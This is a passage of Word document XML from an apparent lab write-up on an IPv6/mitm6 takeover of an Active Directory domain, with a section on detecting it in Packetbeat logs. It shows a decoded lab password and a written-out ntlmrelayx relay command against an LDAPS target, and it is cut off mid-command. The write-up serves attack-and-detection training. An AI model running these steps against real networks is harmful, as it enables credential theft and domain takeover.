              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00B3362E" w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">From the picture above we go inside our </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B3362E" w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>lootme</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B3362E" w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> directory which </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>created</w:t>
      </w:r>
      <w:r w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B3362E" w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">after we running our ipv6 attack and we see there is a lot of html and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B3362E" w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B3362E" w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> files all this files contains information about the domain</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00B3362E" w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="00B3362E" w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>et’s take one file called domain_users_by_group.html and let’s check what we got there.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002602ED" w:rsidRPr="002602ED" w:rsidRDefault="002602ED" w:rsidP="002602ED">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002602ED" w:rsidRDefault="00E7245A" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>It</w:t>
      </w:r>
      <w:r w:rsidR="00B3362E" w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Works! From the picture above we dump all user’s information from this domain we find usernames: administrator, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B3362E" w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ppakrer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B3362E" w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B3362E" w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fcastle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00573CEA" w:rsidRPr="002602ED" w:rsidRDefault="00573CEA" w:rsidP="002602ED">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2E07CFCE" wp14:editId="7CBBD6EB">
            <wp:extent cx="3752850" cy="1371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2850" cy="1371600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00573CEA" w:rsidRDefault="00573CEA" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">And above We also find in the description base64 hash maybe this is the password of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>pparker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> user let’s try decrypt this hash and see what we got.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00573CEA" w:rsidRDefault="00573CEA" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00573CEA" w:rsidRPr="00944C35" w:rsidRDefault="00573CEA" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve">              </w:t>
      </w:r>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Online Base64 Decoder</w:t>
      </w:r>
      <w:r w:rsidR="004A1B95" w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> Cracking First User</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00573CEA" w:rsidRPr="00573CEA" w:rsidRDefault="00573CEA" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="47AE6FAF" wp14:editId="09FF637F">
            <wp:extent cx="5008418" cy="3376047"/>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1893" cy="3391871"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00573CEA" w:rsidRPr="00573CEA" w:rsidRDefault="00573CEA" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">From the picture above we use base64 online decoder we put the string that we find from our </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>lootme</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> directory and we find password for the user </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>pparker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00573CEA" w:rsidRPr="00573CEA" w:rsidRDefault="00573CEA" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Username :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ppakrer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00573CEA" w:rsidRPr="00573CEA" w:rsidRDefault="00573CEA" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Password :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Amigos123</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00573CEA" w:rsidRPr="00573CEA" w:rsidRDefault="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>So now we got the first user credentials on this domain</w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>. G</w:t>
      </w:r>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ood job!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00573CEA" w:rsidRDefault="00573CEA" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00573CEA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Now let’s continue to enumerate try to get access also on the second user and in in the end got the administrator hash and the main goal hack all this network, now let’s</w:t>
      </w:r>
      <w:r w:rsidR="00A26533">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> continue to enumerate.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>MITM IPv6 Takedown Detection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007E710C" w:rsidRDefault="007E710C" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7E7D9FAE" wp14:editId="3463D7C3">
            <wp:extent cx="5343525" cy="107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3525" cy="1076325"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A26533" w:rsidRDefault="008D1FF0" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">From the picture above we first started our </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>dns</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> server that listening for ipv6 requests and we got ipv6 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which is: fe</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>80::</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>b0b8:d0e3:150c:4671 then every ipv6 request that will come to us we will spoof them. Now let’s go to our logs and see what we can catch with this attack.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0FE87720" wp14:editId="642ECD95">
            <wp:extent cx="5486400" cy="6318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631825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="32F84FBC" wp14:editId="7B17B4A3">
            <wp:extent cx="5486400" cy="21043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104390"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRPr="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">As we can see from 2 pictures above we got our log from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>packetbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and I marked in red which show us when the attacker run mitm6 he got ipv6 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> : fe80::b0b8:d0e3:150c:4671</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRPr="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">We can understand from this log there is man in the middle attack because most of the people even not touch the ipv6 configuration so if we see on our network user have ipv6 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> that needs to catch our eyes because if the ipv6 turn on and not configured the attacker can spoof all ivp6 requests so we also catch ipv6 attack</w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Great!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRDefault="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now let’s continue to our next attack which be </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ntlm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>releay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack </w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>through</w:t>
      </w:r>
      <w:r w:rsidR="003D55EA" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ipv6</w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>his is the second tool that we use for our ipv6 takeover attack. Let’s run the attack and see what we can catch with our logs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007E710C" w:rsidRDefault="007E710C" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="007E710C" w:rsidRPr="008D1FF0" w:rsidRDefault="007E710C" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A26533" w:rsidRPr="00573CEA" w:rsidRDefault="008D1FF0" w:rsidP="00573CEA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5665D1DF" wp14:editId="1B314BDA">
            <wp:extent cx="5486400" cy="24060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406015"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRPr="008D1FF0" w:rsidRDefault="003D55EA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">bove we start our </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ntlm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> relay attack with ipv6 requests the command: ntlmrelayx.py -6 -t ldaps://10.10.1.100 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fakewpad.laderlapen</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
